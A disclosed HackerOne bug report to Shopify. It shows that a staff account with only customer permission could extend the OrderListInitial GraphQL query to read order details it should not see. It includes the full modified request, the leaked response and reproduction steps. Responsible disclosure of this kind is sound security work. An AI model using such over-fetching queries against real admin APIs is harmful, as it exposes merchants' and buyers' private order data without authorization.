# OrderListInitial leaks order details

## Report Details
- **Report ID**: 882412
- **URL**: https://hackerone.com/reports/882412
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-25T19:14:32.949Z
- **Disclosed**: 2020-08-18T19:52:15.050Z

## Reporter
- **Username**: sreeju_kc
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Hello,

During my investigation I have noticed that OrderListInitial graphql operation is leaking more information that it suppose to be for a staff with "Customer" only permission.

Normally the graphql call is as below.

POST /admin/internal/web/graphql/core HTTP/1.1
{"operationName":"OrderListInitial","variables":{},"query":"query OrderListInitial {\n  localDeliveryEnabled\n  shop {\n    id\n    ordersDelayedSince\n    appLinks(type: ORDERS, location: INDEX) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    appActions: appLinks(type: ORDERS, location: ACTION) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    plan {\n      trial\n      __typename\n    }\n    showInstallMobileAppBanner\n    features {\n      fraudProtectEligibility\n      eligibleForBulkLabelPurchase\n      __typename\n    }\n    currencyCode\n    __typename\n  }\n  locationsExist: locations(first: 2, includeLegacy: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  ordersAll: orders(first: 1, reverse: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

and the response is below.

"ordersAll":{"edges":[{"node":{"id":"gid:\/\/shopify\/Order\/1936560029718","__typename":"Order"},"__typename":"OrderEdge"}],"__typename":"OrderConnection"}},

But when included more fields in the call as below.

{"operationName":"OrderListInitial","variables":{},"query":"query OrderListInitial {\n  localDeliveryEnabled\n  shop {\n    id\n    ordersDelayedSince\n    appLinks(type: ORDERS, location: INDEX) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    appActions: appLinks(type: ORDERS, location: ACTION) {\n      id\n      text\n      url\n      icon {\n        transformedSrc(maxWidth: 80)\n        __typename\n      }\n      __typename\n    }\n    plan {\n      trial\n      __typename\n    }\n    showInstallMobileAppBanner\n    features {\n      fraudProtectEligibility\n      eligibleForBulkLabelPurchase\n      __typename\n    }\n    currencyCode\n    __typename\n  }\n  locationsExist: locations(first: 2, includeLegacy: true) {\n    edges {\n      node {\n        id\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  ordersAll: orders(first: 1, reverse: true) {\n    edges {\n      node {\n        id\n   billingAddressMatchesShippingAddress\n  canMarkAsPaid\n  canMarkAsPaid\n   capturable\n clientIp\n  createdAt\n  discountCode\n  displayFinancialStatus \n displayFulfillmentStatus\n edited\n email\n fulfillable\n fullyPaid\n merchantEditable\n name\n note\n paymentGatewayNames\n phone\n  refundable\n requiresShipping\n restockable\n  unpaid\n  __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}

The response i received is below.

"ordersAll":{"edges":[{"node":{"id":"gid:\/\/shopify\/Order\/1936560029718","
billingAddressMatchesShippingAddress":false,
"canMarkAsPaid":true,
"capturable":false,
"clientIp":null,
"createdAt":"2020-05-24T21:13:29Z",
"discountCode":null,
"displayFinancialStatus":"PENDING",
"displayFulfillmentStatus":"UNFULFILLED",
"edited":false,
"email":null,
"fulfillable":true,
"fullyPaid":false,
"merchantEditable":false,
"name":"#1006#",
"note":null,
"paymentGatewayNames":["Test"],
"phone":null,
"refundable":false,
"requiresShipping":true,
"restockable":true,
"unpaid":false,"__typename":"Order"},"__typename":"OrderEdge"}],"__typename":"OrderConnection"}

This disclose so many information for a staff with "Customer" only permission (no Order permission)


I haven't tried every possible calls in the order scope, i did not try mutation as well.

Normally a customer should see below informations only for the order linked to the customer.

Orders placed
Order #1006#
Tomorrow at 5:13 pm at 5:13 PM
€1.00 from Draft Orders
AttentionIncompleteUnfulfilled

But you can see here it leaks nearly every information about the order.

POC:
1)Create products, customer and orders.
2)Add a staff with "Customer" only permission  and call the graphql call mentioned above.

## Impact

Make sure that only required informations are disclosed for staff with customer only permission.

## Attachments
- Screenshot_2020-05-25_at_20.37.52.png
- Screenshot_2020-05-25_at_20.59.01.png
- Screenshot_2020-05-25_at_20.59.43.png
